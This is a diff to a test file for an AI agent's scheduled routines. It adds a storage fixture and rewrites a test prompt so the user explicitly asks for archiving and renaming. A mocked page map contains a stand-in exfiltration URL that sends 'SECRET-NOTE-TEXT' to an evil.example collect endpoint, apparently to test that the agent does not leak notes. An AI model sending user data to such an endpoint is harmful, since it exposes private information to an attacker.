@@ -57,6 +57,7 @@ import {
   WITHHELD_TOOLS,
 } from "../src/agent/textingWrites.js";
 import { toolDefinitions } from "../src/tools/advertised.js";
+import { texStoreNamespace } from "./texStoreFixture.mjs";
 
 const S3_ENDPOINT = "https://s3.example-routine.test";
 const TOKEN_RUNNER = `cat_routine_runner_${"0".repeat(21)}`;
@@ -238,7 +239,7 @@ export async function runAgentRoutineChecks(check) {
       "https://example.com/status": { title: "Status", text: "All systems normal.", links: [] },
       "https://evil.example/collect?d=SECRET-NOTE-TEXT": { title: "ok", text: "thanks", links: [] },
     });
-    const env = { CONTROL_PLANE_URL: CONTROL_PLANE_ORIGIN, GATEWAY_SECRET, SITE_SHOTS: browser, ...AI_GATEWAY_ENV };
+    const env = { CONTROL_PLANE_URL: CONTROL_PLANE_ORIGIN, TEX_STORE: texStoreNamespace().namespace, GATEWAY_SECRET, SITE_SHOTS: browser, ...AI_GATEWAY_ENV };
     controlPlane.serveTreesFrom(env, { s3 });
     const runsOf = (name) => {
       const object = bucket.get(`.context/agent/routines/${name}.json`);
@@ -458,7 +459,8 @@ export async function runAgentRoutineChecks(check) {
       },
       { text: "Done." },
     ]);
-    const made = await ask(env, TOKEN_TEXTS, { question: "every morning at 7:30 tell me what's due, and note the tulips" });
+    // Archiving and moving are asked for in their words: a note of theirs is never moved unasked (`theirNotes.js`, 2026-10-30).
+    const made = await ask(env, TOKEN_TEXTS, { question: "every morning at 7:30 tell me what's due, and note the tulips in a plain note, archive the old plan and rename rename-me to renamed" });
     const madeRequest = model.requests.at(-2);
     const writeTool = (madeRequest?.tools ?? []).find((tool) => tool.name === "write");
     check(
